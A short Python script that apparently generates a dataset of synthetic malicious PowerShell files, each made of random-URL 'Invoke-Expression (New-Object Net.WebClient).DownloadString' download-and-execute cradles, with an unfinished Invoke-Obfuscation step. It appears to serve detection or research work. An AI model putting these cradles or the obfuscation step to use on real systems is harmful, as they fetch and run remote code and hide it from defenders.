#Generates a powershell script from the set of random malicious commands
import random
import string
import subprocess

def get_random_dest():
	path = "/" + "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(5,10))])
	if(random.randint(0,1) == 0):
		#Return a domain
		ext = "." + "".join([random.choice(string.ascii_lowercase) for _ in range(random.randint(2,3))])
		hostname = "".join([random.choice(string.ascii_letters) for _ in range(random.randint(10,20))])
		domain = "http://" + hostname + ext + path
		return domain
	else:
		ip = str(random.randint(0,200)) + "." + str(random.randint(0,200)) + "." + str(random.randint(0,200))+ "." + str(random.randint(0,200))
		return ip + path

def get_payload_cmd():
	ip = get_random_dest()
	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + ip + "\") \n"

commands = [get_payload_cmd]

def generate_script():
	script = ""

	for f in [random.choice(commands) for _ in range(5)]:
		script+=f()

	return script

def generate_raw(n):
	for i in range(n):
		script = generate_script()
		f = open(f"res/dataset-{i}.ps1",'w')
		f.write(script)
		f.close()

def generate_obfs(n):
	generate_raw(n)

	#Still need to figure out how this is gonna work
	#p = subprocess.Popen(['powershell.exe', './Invoke-Obfuscation'], stdout=sys.stdout)


generate_obfs(10)